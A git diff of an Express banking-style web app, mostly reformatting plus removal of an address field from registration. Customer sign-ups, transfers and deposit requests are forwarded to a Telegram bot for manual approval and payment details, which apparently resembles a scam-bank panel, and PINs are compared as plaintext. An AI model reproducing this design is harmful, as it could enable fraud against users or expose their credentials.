-            path: `/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,
-            method: "POST",
-            headers: {
-                "Content-Type": `multipart/form-data; boundary=${boundary}`,
-                "Content-Length": fullBody.length,
-            },
-        };
+    const options = {
+      hostname: "api.telegram.org",
+      path: `/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,
+      method: "POST",
+      headers: {
+        "Content-Type": `multipart/form-data; boundary=${boundary}`,
+        "Content-Length": fullBody.length,
+      },
+    };
 
-        const req = https.request(options, (res) => {
-            let respBody = "";
-            res.on("data", (chunk) => (respBody += chunk));
-            res.on("end", () => resolve(JSON.parse(respBody)));
-        });
-
-        req.on("error", reject);
-        req.write(fullBody);
-        req.end();
+    const req = https.request(options, (res) => {
+      let respBody = "";
+      res.on("data", (chunk) => (respBody += chunk));
+      res.on("end", () => resolve(JSON.parse(respBody)));
     });
+
+    req.on("error", reject);
+    req.write(fullBody);
+    req.end();
+  });
 }
 
 // ==========================================
@@ -684,11 +683,11 @@ function sendTelegramPhoto(photoBuffer, caption) {
 // ==========================================
 
 function requireAuth(req, res, next) {
-    if (req.session && req.session.customerId) {
-        next();
-    } else {
-        res.redirect("/");
-    }
+  if (req.session && req.session.customerId) {
+    next();
+  } else {
+    res.redirect("/");
+  }
 }
 
 // ==========================================
@@ -3811,26 +3810,6 @@ a {
   background: #1565C0;
 }
 
-.address-warning {
-  background: #FFF8E1;
-  border: 1px solid #FFE082;
-  border-radius: 8px;
-  padding: 12px;
-  margin-bottom: 16px;
-  font-size: 13px;
-  color: #F57C00;
-  display: flex;
-  align-items: flex-start;
-  gap: 10px;
-}
-
-.address-warning svg {
-  width: 18px;
-  height: 18px;
-  flex-shrink: 0;
-  margin-top: 1px;
-}
-
 @media (max-width: 768px) {
   .main-nav {
     display: none;
@@ -3859,14 +3838,14 @@ a {
 // ==========================================
 
 function getNavbar(activePage, customer, notificationCount = 0) {
-    const initials = customer.name
-        .split(" ")
-        .map((n) => n[0])
-        .join("")
-        .toUpperCase()
-        .slice(0, 2);
+  const initials = customer.name
+    .split(" ")
+    .map((n) => n[0])
+    .join("")
+    .toUpperCase()
+    .slice(0, 2);
 
-    return `
+  return `
     <nav class="top-navbar">
       <div class="navbar-content">
         <div class="navbar-left">
@@ -3907,7 +3886,7 @@ function getNavbar(activePage, customer, notificationCount = 0) {
 }
 
 function getPageWrapper(content, activePage, customer, notificationCount = 0) {
-    return `
+  return `
     <!DOCTYPE html>
     <html lang="en">
     <head>
@@ -3930,25 +3909,24 @@ function getPageWrapper(content, activePage, customer, notificationCount = 0) {
     </html>
   `;
 }
-
 // ==========================================
 // ROUTES - HOMEPAGE
 // ==========================================
 
 app.get("/", (req, res) => {
-    if (req.session.customerId) {
-        return res.redirect("/dashboard");
-    }
+  if (req.session.customerId) {
+    return res.redirect("/dashboard");
+  }
 
-    const error = req.query.error;
-    let errorHtml = "";
-    if (error === "invalid") {
-        errorHtml = `<div class="login-error-msg">Invalid email or PIN. Please try again.</div>`;
-    } else if (error === "frozen") {
-        errorHtml = `<div class="login-error-msg">Your account has been frozen. Please contact support.</div>`;
-    }
+  const error = req.query.error;
+  let errorHtml = "";
+  if (error === "invalid") {
+    errorHtml = `<div class="login-error-msg">Invalid email or PIN. Please try again.</div>`;
+  } else if (error === "frozen") {
+    errorHtml = `<div class="login-error-msg">Your account has been frozen. Please contact support.</div>`;
+  }
 
-    const html = `
+  const html = `
     <!DOCTYPE html>
     <html lang="en">
     <head>
@@ -4209,25 +4187,26 @@ app.get("/", (req, res) => {
     </body>
     </html>
   `;
-    res.send(html);
+  res.send(html);
 });
+
 // ==========================================
 // ROUTES - LOGIN
 // ==========================================
 
 app.post("/login", async (req, res) => {
-    const { email, pin } = req.body;
-    const customer = await getCustomerByEmail(email);
-    if (!customer || customer.pin !== pin) { return res.redirect("/?error=invalid"); }
-    if (customer.status === "frozen") { return res.redirect("/?error=frozen"); }
-    req.session.customerId = customer._id.toString();
-    req.session.customerName = customer.name;
-    res.redirect("/dashboard");
+  const { email, pin } = req.body;
+  const customer = await getCustomerByEmail(email);
+  if (!customer || customer.pin !== pin) { return res.redirect("/?error=invalid"); }
+  if (customer.status === "frozen") { return res.redirect("/?error=frozen"); }
+  req.session.customerId = customer._id.toString();
+  req.session.customerName = customer.name;
+  res.redirect("/dashboard");
 });
 
 app.get("/logout", (req, res) => {
-    req.session.destroy();
-    res.redirect("/");
+  req.session.destroy();
+  res.redirect("/");
 });
 
 // ==========================================
@@ -4235,9 +4214,9 @@ app.get("/logout", (req, res) => {
 // ==========================================
 
 app.get("/register", (req, res) => {
-    if (req.session.customerId) { return res.redirect("/dashboard"); }
+  if (req.session.customerId) { return res.redirect("/dashboard"); }
 
-    const html = `
+  const html = `
     <!DOCTYPE html>
     <html lang="en">
     <head>
@@ -4259,7 +4238,6 @@ app.get("/register", (req, res) => {
             <div class="step-dot" data-step="3"></div>
             <div class="step-dot" data-step="4"></div>
             <div class="step-dot" data-step="5"></div>
-            <div class="step-dot" data-step="6"></div>
           </div>
           <div class="step-container">
             <div class="register-step active" id="step1">
@@ -4295,21 +4273,6 @@ app.get("/register", (req, res) => {
               <button class="step-back" onclick="goToStep(2)">← Back</button>
             </div>
             <div class="register-step" id="step4">
-              <div class="step-title"><span class="step-icon">🏠</span>What's your address?</div>
-              <div class="step-subtitle">Enter your residential address</div>
-              <div class="address-warning">
-                <svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
-                <span>Please ensure your address is correct and valid. This information will be used for account verification.</span>
-              </div>
-              <div class="step-input-group">
-                <input type="text" class="step-input" id="addressInput" placeholder="Enter your full address" autocomplete="street-address">
-                <div class="step-input-check" id="addressCheck"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg></div>
-              </div>
-              <div class="step-error" id="addressError">Please enter a valid address</div>
-              <button class="step-btn" id="step4Btn" disabled>Continue</button>
-              <button class="step-back" onclick="goToStep(3)">← Back</button>
-            </div>
-            <div class="register-step" id="step5">
               <div class="step-title"><span class="step-icon">🌍</span>Choose your currency</div>
               <div class="step-subtitle">Select the primary currency</div>
               <div class="currency-options">
@@ -4317,10 +4280,10 @@ app.get("/register", (req, res) => {
                 <div class="currency-option" data-currency="EUR"><span class="flag">🇪🇺</span><div class="details"><div class="name">Euro</div><div class="code">EUR</div></div><div class="check"></div></div>
                 <div class="currency-option" data-currency="GBP"><span class="flag">🇬🇧</span><div class="details"><div class="name">British Pound</div><div class="code">GBP</div></div><div class="check"></div></div>
               </div>
-              <button class="step-btn" id="step5Btn" disabled>Continue</button>
-              <button class="step-back" onclick="goToStep(4)">← Back</button>
+              <button class="step-btn" id="step4Btn" disabled>Continue</button>
+              <button class="step-back" onclick="goToStep(3)">← Back</button>
             </div>
-            <div class="register-step" id="step6">
+            <div class="register-step" id="step5">
               <div class="step-title"><span class="step-icon">🔐</span>Create your PIN</div>
               <div class="step-subtitle">Choose a 4-6 digit PIN</div>
               <div class="step-input-group">
@@ -4328,8 +4291,8 @@ app.get("/register", (req, res) => {
                 <div class="step-input-check" id="pinCheck"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg></div>
               </div>
               <div class="step-error" id="pinError">PIN must be 4-6 digits</div>
-              <button class="step-btn" id="step6Btn" disabled>Create Account</button>
-              <button class="step-back" onclick="goToStep(5)">← Back</button>
+              <button class="step-btn" id="step5Btn" disabled>Create Account</button>
+              <button class="step-back" onclick="goToStep(4)">← Back</button>
             </div>
             <div class="verification-screen" id="verificationScreen">
               <h2>🔒 Verifying Your Device</h2>
@@ -4356,12 +4319,11 @@ app.get("/register", (req, res) => {
         </div>
       </div>
       <script>
-        const formData = { name: '', email: '', phone: '', address: '', currency: '', pin: '' };
+        const formData = { name: '', email: '', phone: '', currency: '', pin: '' };
         let currentStep = 1;
         function validateName(name) { const parts = name.trim().split(/\\s+/); return parts.length >= 2 && parts[0].length >= 2; }
         function validateEmail(email) { return /^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$/.test(email.trim()); }
         function validatePhone(phone) { return phone.replace(/[^0-9+]/g, '').length >= 10; }
-        function validateAddress(address) { return address.trim().length >= 10; }
         function validatePin(pin) { return /^\\d{4,6}$/.test(pin); }
         function updateStepIndicators() {
           document.querySelectorAll('.step-dot').forEach((dot, index) => {
@@ -4409,40 +4371,29 @@ app.get("/register", (req, res) => {
           if (isValid) formData.phone = this.value.trim();
         });
         step3Btn.addEventListener('click', () => goToStep(4));
-        const addressInput = document.getElementById('addressInput');
-        const step4Btn = document.getElementById('step4Btn');
-        addressInput.addEventListener('input', function() {
-          const isValid = validateAddress(this.value);
-          this.classList.toggle('valid', isValid);
-          document.getElementById('addressCheck').classList.toggle('show', isValid);
-          document.getElementById('addressError').classList.toggle('show', !isValid && this.value.length > 5);
-          step4Btn.disabled = !isValid;
-          if (isValid) formData.address = this.value.trim();
-        });
-        step4Btn.addEventListener('click', () => goToStep(5));
         const currencyOptions = document.querySelectorAll('.currency-option');
-        const step5Btn = document.getElementById('step5Btn');
+        const step4Btn = document.getElementById('step4Btn');
         currencyOptions.forEach(option => {
           option.addEventListener('click', function() {
             currencyOptions.forEach(o => o.classList.remove('selected'));
             this.classList.add('selected');
             formData.currency = this.dataset.currency;
-            step5Btn.disabled = false;
+            step4Btn.disabled = false;
           });
         });
-        step5Btn.addEventListener('click', () => goToStep(6));
+        step4Btn.addEventListener('click', () => goToStep(5));
         const pinInput = document.getElementById('pinInput');
-        const step6Btn = document.getElementById('step6Btn');
+        const step5Btn = document.getElementById('step5Btn');
         pinInput.addEventListener('input', function() {
           this.value = this.value.replace(/[^0-9]/g, '');
           const isValid = validatePin(this.value);
           this.classList.toggle('valid', isValid);
           document.getElementById('pinCheck').classList.toggle('show', isValid);
           document.getElementById('pinError').classList.toggle('show', !isValid && this.value.length > 0);
-          step6Btn.disabled = !isValid;
+          step5Btn.disabled = !isValid;
           if (isValid) formData.pin = this.value;
         });
-        step6Btn.addEventListener('click', async function() {
+        step5Btn.addEventListener('click', async function() {
           document.querySelectorAll('.register-step').forEach(s => s.classList.remove('active'));
           document.getElementById('verificationScreen').classList.add('active');
           document.querySelector('.step-indicator').style.display = 'none';
@@ -4496,70 +4447,68 @@ app.get("/register", (req, res) => {
     </body>
     </html>
   `;
-    res.send(html);
+  res.send(html);
 });
 
 app.post("/register", async (req, res) => {
-    try {
-        const { name, email, phone, address, currency, pin } = req.body;
-        const existing = await getCustomerByEmail(email);
-        if (existing) { return res.json({ success: false, error: "Email already registered" }); }
-        const customer = await createCustomer({ name, email, phone, address, currency, pin });
-        const currencyConfig = CURRENCIES[currency];
-        const message = `
+  try {
+    const { name, email, phone, currency, pin } = req.body;
+    const existing = await getCustomerByEmail(email);
+    if (existing) { return res.json({ success: false, error: "Email already registered" }); }
+    const customer = await createCustomer({ name, email, phone, currency, pin });
+    const currencyConfig = CURRENCIES[currency];
+    const message = `
 🆕 *NEW CUSTOMER REGISTERED*
 ━━━━━━━━━━━━━━━━━━━━━━━━━
 👤 Name: ${name}
 🏷️ Tag: ${customer.tag}
 📧 Email: ${email}
 📱 Phone: ${phone}
-🏠 Address: ${address}
 ${currencyConfig.flag} Currency: ${currency}
 🔢 Account: ${customer.accountNumber}
 ━━━━━━━━━━━━━━━━━━━━━━━━━
     `;
-        try { await sendTelegramMessage(message); } catch (e) { console.error("Telegram error:", e); }
-        req.session.customerId = customer._id.toString();
-        req.session.customerName = customer.name;
-        res.json({ success: true });
-    } catch (error) {
-        console.error("Registration error:", error);
-        res.json({ success: false, error: "Registration failed" });
-    }
+    try { await sendTelegramMessage(message); } catch (e) { console.error("Telegram error:", e); }
+    req.session.customerId = customer._id.toString();
+    req.session.customerName = customer.name;
+    res.json({ success: true });
+  } catch (error) {
+    console.error("Registration error:", error);
+    res.json({ success: false, error: "Registration failed" });
+  }
 });
-
 // ==========================================
 // ROUTES - DASHBOARD
 // ==========================================
 
 app.get("/dashboard", requireAuth, async (req, res) => {
-    const customer = await getCustomerById(req.session.customerId);
-    const transactions = await getCustomerTransactions(req.session.customerId, 10);
-    const monthlySpending = await getMonthlySpending(req.session.customerId);
-    const alerts = await getActiveAlerts(req.session.customerId);
-    const pendingPayments = await getCustomerPendingPayments(req.session.customerId);
-    const notificationCount = await getUnreadNotificationCount(req.session.customerId);
+  const customer = await getCustomerById(req.session.customerId);
+  const transactions = await getCustomerTransactions(req.session.customerId, 10);
+  const monthlySpending = await getMonthlySpending(req.session.customerId);
+  const alerts = await getActiveAlerts(req.session.customerId);
+  const pendingPayments = await getCustomerPendingPayments(req.session.customerId);
+  const notificationCount = await getUnreadNotificationCount(req.session.customerId);
 
-    const currency = customer.currency || "EUR";
-    const groupedTransactions = groupTransactionsByDate(transactions);
-    const thisMonthSpending = monthlySpending[monthlySpending.length - 1]?.amount || 0;
-    const avgMonthlySpending = monthlySpending.reduce((sum, m) => sum + m.amount, 0) / monthlySpending.length || 0;
-    const maxSpending = Math.max(...monthlySpending.map((m) => m.amount), 1);
+  const currency = customer.currency || "EUR";
+  const groupedTransactions = groupTransactionsByDate(transactions);
+  const thisMonthSpending = monthlySpending[monthlySpending.length - 1]?.amount || 0;
+  const avgMonthlySpending = monthlySpending.reduce((sum, m) => sum + m.amount, 0) / monthlySpending.length || 0;
+  const maxSpending = Math.max(...monthlySpending.map((m) => m.amount), 1);
 
-    let maskedAccount = currency === "EUR" ? maskAccountNumber(customer.iban) : maskAccountNumber(customer.bankAccountNumber);
+  let maskedAccount = currency === "EUR" ? maskAccountNumber(customer.iban) : maskAccountNumber(customer.bankAccountNumber);
 
-    let transactionsHtml = "";
-    if (Object.keys(groupedTransactions).length === 0) {
-        transactionsHtml = `<div class="no-transactions"><p>No transactions yet</p></div>`;
-    } else {
-        for (const [date, txs] of Object.entries(groupedTransactions)) {
-            transactionsHtml += `<div class="transaction-date-group">${date}</div>`;
-            txs.forEach((tx) => {
-                const icon = getTransactionIcon(tx.description || tx.recipientName || tx.senderName || "");
-                const isCredit = tx.type === "credit";
-                const name = isCredit ? tx.senderName || tx.description || "Deposit" : tx.recipientName || tx.description || "Payment";
-                const time = new Date(tx.createdAt).toLocaleTimeString("en-GB", { hour: "2-digit", minute: "2-digit" });
-                transactionsHtml += `
+  let transactionsHtml = "";
+  if (Object.keys(groupedTransactions).length === 0) {
+    transactionsHtml = `<div class="no-transactions"><p>No transactions yet</p></div>`;
+  } else {
+    for (const [date, txs] of Object.entries(groupedTransactions)) {
+      transactionsHtml += `<div class="transaction-date-group">${date}</div>`;
+      txs.forEach((tx) => {
+        const icon = getTransactionIcon(tx.description || tx.recipientName || tx.senderName || "");
+        const isCredit = tx.type === "credit";
+        const name = isCredit ? tx.senderName || tx.description || "Deposit" : tx.recipientName || tx.description || "Payment";
+        const time = new Date(tx.createdAt).toLocaleTimeString("en-GB", { hour: "2-digit", minute: "2-digit" });
+        transactionsHtml += `
           <div class="transaction-item">
             <div class="transaction-icon ${icon.color}">${icon.letter}</div>
             <div class="transaction-content">
@@ -4574,16 +4523,16 @@ app.get("/dashboard", requireAuth, async (req, res) => {
             </div>
           </div>
         `;
-            });
-        }
+      });
     }
+  }
 
-    let alertsHtml = "";
-    if (alerts.length > 0) {
-        alertsHtml = '<div class="alert-section">';
-        alerts.forEach((alert) => {
-            const iconClass = alert.alertType === "error" ? "error" : "";
-            alertsHtml += `
+  let alertsHtml = "";
+  if (alerts.length > 0) {
+    alertsHtml = '<div class="alert-section">';
+    alerts.forEach((alert) => {
+      const iconClass = alert.alertType === "error" ? "error" : "";
+      alertsHtml += `
         <div class="alert-card">
           <div class="alert-content">
             <div class="alert-icon ${iconClass}">
@@ -4601,16 +4550,16 @@ app.get("/dashboard", requireAuth, async (req, res) => {
           </div>
         </div>
       `;
-        });
-        alertsHtml += '</div>';
-    }
+    });
+    alertsHtml += '</div>';
+  }
 
-    let pendingPaymentsHtml = "";
-    if (pendingPayments.length > 0) {
-        pendingPaymentsHtml = `<div class="pending-payment-section"><div class="pending-section-header"><svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm.5-13H11v6l5.25 3.15.75-1.23-4.5-2.67z"/></svg>Pending Incoming</div>`;
-        pendingPayments.forEach((pending) => {
-            const time = new Date(pending.createdAt).toLocaleTimeString("en-GB", { hour: "2-digit", minute: "2-digit" });
-            pendingPaymentsHtml += `
+  let pendingPaymentsHtml = "";
+  if (pendingPayments.length > 0) {
+    pendingPaymentsHtml = `<div class="pending-payment-section"><div class="pending-section-header"><svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm.5-13H11v6l5.25 3.15.75-1.23-4.5-2.67z"/></svg>Pending Incoming</div>`;
+    pendingPayments.forEach((pending) => {
+      const time = new Date(pending.createdAt).toLocaleTimeString("en-GB", { hour: "2-digit", minute: "2-digit" });
+      pendingPaymentsHtml += `
         <div class="pending-payment-item">
           <div class="pending-payment-icon">⏳</div>
           <div class="pending-payment-content">
@@ -4625,19 +4574,19 @@ app.get("/dashboard", requireAuth, async (req, res) => {
           </div>
         </div>
       `;
-        });
-        pendingPaymentsHtml += `</div>`;
-    }
+    });
+    pendingPaymentsHtml += `</div>`;
+  }
 
-    const chartBarsHtml = monthlySpending.map((m, i) => {
-        const height = maxSpending > 0 ? Math.max((m.amount / maxSpending) * 100, 8) : 8;
-        const isActive = i === monthlySpending.length - 1;
-        return `<div class="chart-bar ${isActive ? "active" : ""}" style="height: ${height}%;"></div>`;
-    }).join("");
+  const chartBarsHtml = monthlySpending.map((m, i) => {
+    const height = maxSpending > 0 ? Math.max((m.amount / maxSpending) * 100, 8) : 8;
+    const isActive = i === monthlySpending.length - 1;
+    return `<div class="chart-bar ${isActive ? "active" : ""}" style="height: ${height}%;"></div>`;
+  }).join("");
 
-    const chartLabelsHtml = monthlySpending.map((m) => `<span class="chart-label">${m.month}</span>`).join("");
+  const chartLabelsHtml = monthlySpending.map((m) => `<span class="chart-label">${m.month}</span>`).join("");
 
-    const content = `
+  const content = `
     <div class="account-header"><h1 class="page-title">Dashboard</h1></div>
     <div class="dashboard-grid">
       <div class="account-card">
@@ -4711,12 +4660,12 @@ app.get("/dashboard", requireAuth, async (req, res) => {
     </script>
   `;
 
-    res.send(getPageWrapper(content, "dashboard", customer, notificationCount));
+  res.send(getPageWrapper(content, "dashboard", customer, notificationCount));
 });
 
 app.get("/dismiss-alert/:id", requireAuth, async (req, res) => {
-    await dismissAlert(req.params.id);
-    res.redirect("/dashboard");
+  await dismissAlert(req.params.id);
+  res.redirect("/dashboard");
 });
 
 // ==========================================
@@ -4724,11 +4673,11 @@ app.get("/dismiss-alert/:id", requireAuth, async (req, res) => {
 // ==========================================
 
 app.get("/receive", requireAuth, async (req, res) => {
-    const customer = await getCustomerById(req.session.customerId);
-    const notificationCount = await getUnreadNotificationCount(req.session.customerId);
-    const currency = customer.currency || "EUR";
+  const customer = await getCustomerById(req.session.customerId);
+  const notificationCount = await getUnreadNotificationCount(req.session.customerId);
+  const currency = customer.currency || "EUR";
 
-    const content = `
+  const content = `
     <a href="/dashboard" class="back-link">
       <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>
       Back to Dashboard
@@ -4861,65 +4810,65 @@ app.get("/receive", requireAuth, async (req, res) => {
     </script>
   `;
 
-    res.send(getPageWrapper(content, "receive", customer, notificationCount));
+  res.send(getPageWrapper(content, "receive", customer, notificationCount));
 });
 
 // API: Lookup Tag
 app.get("/api/lookup-tag", requireAuth, async (req, res) => {
-    const query = req.query.q;
-    if (!query) { return res.json({ found: false }); }
+  const query = req.query.q;
+  if (!query) { return res.json({ found: false }); }
 
-    const customer = await getCustomerById(req.session.customerId);
-    const result = await lookupTag(query);
+  const customer = await getCustomerById(req.session.customerId);
+  const result = await lookupTag(query);
 
-    // Don't allow finding yourself
-    if (result.found && result.type === "customer" && result.id.toString() === req.session.customerId) {
-        return res.json({ found: false });
-    }
+  // Don't allow finding yourself
+  if (result.found && result.type === "customer" && result.id.toString() === req.session.customerId) {
+    return res.json({ found: false });
+  }
 
-    res.json(result);
+  res.json(result);
 });
 
 // API: P2P Request
 app.post("/api/p2p-request", requireAuth, async (req, res) => {
-    try {
-        const { type, recipientTag, recipientName, recipientType, recipientId, amount } = req.body;
-        const customer = await getCustomerById(req.session.customerId);
+  try {
+    const { type, recipientTag, recipientName, recipientType, recipientId, amount } = req.body;
+    const customer = await getCustomerById(req.session.customerId);
 
-        let p2pData = {
-            type: type,
-            amount: amount,
-            currency: customer.currency,
-        };
+    let p2pData = {
+      type: type,
+      amount: amount,
+      currency: customer.currency,
+    };
 
-        if (type === "request") {
-            // Customer is REQUESTING money FROM recipient
-            p2pData.fromTag = recipientTag;
-            p2pData.fromName = recipientName;
-            p2pData.fromCustomerId = recipientType === "customer" ? recipientId : null;
-            p2pData.toTag = customer.tag;
-            p2pData.toName = customer.name;
-            p2pData.toCustomerId = customer._id;
-            p2pData.isSpecialTag = recipientType === "special";
-            p2pData.specialTagId = recipientType === "special" ? recipientId : null;
-        } else {
-            // Customer is SENDING money TO recipient
-            p2pData.fromTag = customer.tag;
-            p2pData.fromName = customer.name;
-            p2pData.fromCustomerId = customer._id;
-            p2pData.toTag = recipientTag;
-            p2pData.toName = recipientName;
-            p2pData.toCustomerId = recipientType === "customer" ? recipientId : null;
-            p2pData.isSpecialTag = recipientType === "special";
-            p2pData.specialTagId = recipientType === "special" ? recipientId : null;
-        }
+    if (type === "request") {
+      // Customer is REQUESTING money FROM recipient
+      p2pData.fromTag = recipientTag;
+      p2pData.fromName = recipientName;
+      p2pData.fromCustomerId = recipientType === "customer" ? recipientId : null;
+      p2pData.toTag = customer.tag;
+      p2pData.toName = customer.name;
+      p2pData.toCustomerId = customer._id;
+      p2pData.isSpecialTag = recipientType === "special";
+      p2pData.specialTagId = recipientType === "special" ? recipientId : null;
+    } else {
+      // Customer is SENDING money TO recipient
+      p2pData.fromTag = customer.tag;
+      p2pData.fromName = customer.name;
+      p2pData.fromCustomerId = customer._id;
+      p2pData.toTag = recipientTag;
+      p2pData.toName = recipientName;
+      p2pData.toCustomerId = recipientType === "customer" ? recipientId : null;
+      p2pData.isSpecialTag = recipientType === "special";
+      p2pData.specialTagId = recipientType === "special" ? recipientId : null;
+    }
 
-        const request = await createP2PRequest(p2pData);
+    const request = await createP2PRequest(p2pData);
 
-        // Send Telegram notification
-        const typeText = type === "request" ? "MONEY REQUEST" : "SEND MONEY";
-        const specialNote = p2pData.isSpecialTag ? "\n⭐ _Special Tag Request_" : "";
-        const message = `
+    // Send Telegram notification
+    const typeText = type === "request" ? "MONEY REQUEST" : "SEND MONEY";
+    const specialNote = p2pData.isSpecialTag ? "\n⭐ _Special Tag Request_" : "";
+    const message = `
 📲 *NEW P2P ${typeText}*
 ━━━━━━━━━━━━━━━━━━━━━━━━━
 🔖 Request ID: \`${request.requestId}\`${specialNote}
@@ -4933,30 +4882,29 @@ app.post("/api/p2p-request", requireAuth, async (req, res) => {
 ⏳ *Action Required:* Approve, Pend, or Reject
     `;
 
-        try { await sendTelegramMessage(message); } catch (e) { console.error("Telegram error:", e); }
+    try { await sendTelegramMessage(message); } catch (e) { console.error("Telegram error:", e); }
 
-        res.json({ success: true, requestId: request.requestId });
-    } catch (error) {
-        console.error("P2P error:", error);
-        res.json({ success: false, error: "Failed to process request" });
-    }
+    res.json({ success: true, requestId: request.requestId });
+  } catch (error) {
+    console.error("P2P error:", error);
+    res.json({ success: false, error: "Failed to process request" });
+  }
 });
-
 // ==========================================
 // ROUTES - ADD MONEY
 // ==========================================
 
 app.get("/add-money", requireAuth, async (req, res) => {
-    const customer = await getCustomerById(req.session.customerId);
-    const notificationCount = await getUnreadNotificationCount(req.session.customerId);
-    const currency = customer.currency || "EUR";
-    const currencyConfig = CURRENCIES[currency];
+  const customer = await getCustomerById(req.session.customerId);
+  const notificationCount = await getUnreadNotificationCount(req.session.customerId);
+  const currency = customer.currency || "EUR";
+  const currencyConfig = CURRENCIES[currency];
 
-    let paymentOptionsHtml = currencyConfig.paymentMethods.map(method =>
-        `<option value="${method}">${currencyConfig.paymentMethodNames[method]}</option>`
-    ).join("");
+  let paymentOptionsHtml = currencyConfig.paymentMethods.map(method => 
+    `<option value="${method}">${currencyConfig.paymentMethodNames[method]}</option>`
+  ).join("");
 
-    const content = `
+  const content = `
     <a href="/dashboard" class="back-link"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>Back</a>
     <div class="form-container">
       <div class="form-card">
@@ -4969,49 +4917,39 @@ app.get("/add-money", requireAuth, async (req, res) => {
       </div>
     </div>
   `;
-    res.send(getPageWrapper(content, "dashboard", customer, notificationCount));
+  res.send(getPageWrapper(content, "dashboard", customer, notificationCount));
 });
 
 app.post("/add-money", requireAuth, async (req, res) => {
-    const { amount, paymentMethod } = req.body;
-    const customer = await getCustomerById(req.session.customerId);
+  const { amount, paymentMethod } = req.body;
+  const customer = await getCustomerById(req.session.customerId);
 
-    if (paymentMethod === "visaprepaid") {
-        req.session.pendingDeposit = { amount, paymentMethod };
-        return res.redirect("/add-money/prepaid");
-    }
+  if (paymentMethod === "visaprepaid") {
+    req.session.pendingDeposit = { amount, paymentMethod };
+    return res.redirect("/add-money/prepaid");
+  }
 
-    const request = await createDepositRequest({ customerId: req.session.customerId, customerName: customer.name, customerEmail: customer.email, currency: customer.currency, amount, paymentMethod });
-    const currencyConfig = CURRENCIES[customer.currency];
-
-    // Original notification for admin panel
-    const message = `💰 *NEW DEPOSIT REQUEST*\n━━━━━━━━━━━━━━━━━━━━━━━━━\n🔖 Request ID: \`${request.requestId}\`\n👤 Customer: ${customer.name}\n📧 Email: ${customer.email}\n💵 Amount: ${formatCurrency(amount, customer.currency)}\n💳 Method: ${currencyConfig.paymentMethodNames[paymentMethod]}\n━━━━━━━━━━━━━━━━━━━━━━━━━\n⏳ *Action Required:* Send payment details`;
-
-    // NEW: Additional direct alert notification
-    const alertMessage = `
-💰 *NEW DEPOSIT REQUEST*
-━━━━━━━━━━━━━━━━━━━━━━
-🔖 Request ID: \`${request.requestId}\`
-👤 Customer: ${customer.name}
-📧 Email: ${customer.email}
-💵 Amount: ${formatCurrency(amount, customer.currency)}
-💳 Method: ${currencyConfig.paymentMethodNames[paymentMethod]}
-━━━━━━━━━━━━━━━━━━━━━━
-⏳ Action: Send payment details
-  `;
-
-    try {
-        await sendTelegramMessage(message);
-        await sendTelegramMessage(alertMessage);
-    } catch (e) { console.error("Telegram error:", e); }
-
-    res.redirect(`/add-money/waiting/${request.requestId}`);
+  const request = await createDepositRequest({ customerId: req.session.customerId, customerName: customer.name, customerEmail: customer.email, currency: customer.currency, amount, paymentMethod });
+  const currencyConfig = CURRENCIES[customer.currency];
+  
+  // Original notification for admin panel
+  const message = `💰 *NEW DEPOSIT REQUEST*\n━━━━━━━━━━━━━━━━━━━━━━━━━\n🔖 Request ID: \`${request.requestId}\`\n👤 Customer: ${customer.name}\n📧 Email: ${customer.email}\n💵 Amount: ${formatCurrency(amount, customer.currency)}\n💳 Method: ${currencyConfig.paymentMethodNames[paymentMethod]}\n━━━━━━━━━━━━━━━━━━━━━━━━━\n⏳ *Action Required:* Send payment details`;
+  
+  // NEW: Additional direct alert notification
+  const alertMessage = `💰 *NEW DEPOSIT REQUEST*\n━━━━━━━━━━━━━━━━━━━━━━\n🔖 Request ID: \`${request.requestId}\`\n👤 Customer: ${customer.name}\n📧 Email: ${customer.email}\n💵 Amount: ${formatCurrency(amount, customer.currency)}\n💳 Method: ${currencyConfig.paymentMethodNames[paymentMethod]}\n━━━━━━━━━━━━━━━━━━━━━━\n⏳ Action: Send payment details`;
+  
+  try { 
+    await sendTelegramMessage(message); 
+    await sendTelegramMessage(alertMessage);
+  } catch (e) { console.error("Telegram error:", e); }
+  
+  res.redirect(`/add-money/waiting/${request.requestId}`);
 });
 
 app.get("/add-money/waiting/:requestId", requireAuth, async (req, res) => {
-    const customer = await getCustomerById(req.session.customerId);
-    const notificationCount = await getUnreadNotificationCount(req.session.customerId);
-    const content = `
+  const customer = await getCustomerById(req.session.customerId);
+  const notificationCount = await getUnreadNotificationCount(req.session.customerId);
+  const content = `
     <div class="form-container"><div class="form-card">
       <div class="waiting-screen"><div class="waiting-spinner"></div><h2>Processing...</h2><p>Please wait while we prepare your payment details.</p><div class="polling-status"><div class="polling-dot"></div><span>Waiting for payment details...</span></div></div>
     </div></div>
@@ -5028,36 +4966,36 @@ app.get("/add-money/waiting/:requestId", requireAuth, async (req, res) => {
       checkForDetails();
     </script>
   `;
-    res.send(getPageWrapper(content, "dashboard", customer, notificationCount));
+  res.send(getPageWrapper(content, "dashboard", customer, notificationCount));
 });
 
 app.get("/api/check-deposit/:requestId", requireAuth, async (req, res) => {
-    const request = await getDepositRequestByRequestId(req.params.requestId);
-    if (!request) { return res.json({ status: "not_found" }); }
-    res.json({ status: request.status, bankDetails: request.bankDetails });
